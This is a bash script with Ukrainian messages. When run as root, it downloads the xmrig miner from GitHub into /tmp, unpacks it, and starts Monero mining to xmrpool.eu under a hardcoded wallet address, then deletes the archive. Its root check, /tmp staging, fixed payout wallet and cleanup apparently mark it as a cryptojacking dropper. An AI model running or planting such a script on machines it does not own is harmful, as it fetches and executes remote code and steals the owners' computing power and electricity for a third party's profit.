#!/bin/bash

if [ "$(id -u)" -eq 0 ]; then
    echo "Користувач є root. Встановлення xmrig."

    cd /tmp

    xmrig_url="https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz"
    xmrig_tar="xmrig-6.12.1-linux-x64.tar.gz"

    if command -v wget > /dev/null; then
        wget $xmrig_url
    elif command -v curl > /dev/null; then
        curl -O $xmrig_url
    else
        echo "wget або curl не встановлені. Неможливо завантажити xmrig."
        exit 1
    fi

    tar xvf $xmrig_tar
    cd xmrig-6.12.1

    chmod +x xmrig

    ./xmrig --coin 'monero' -o xmrpool.eu:5555 -u 487wHdcMHRUSxgWzZupSD4STpUomqHdmfdaK1HxYEs1x3B9YG4suhwiVq1jo8AV15EhF9CyHwfKenEKnXVqWs4LS8nQeDSe -p x

    cd ..
    rm -f $xmrig_tar

else
    echo "Поточний користувач не є root. Скрипт не може продовжуватися."
fi
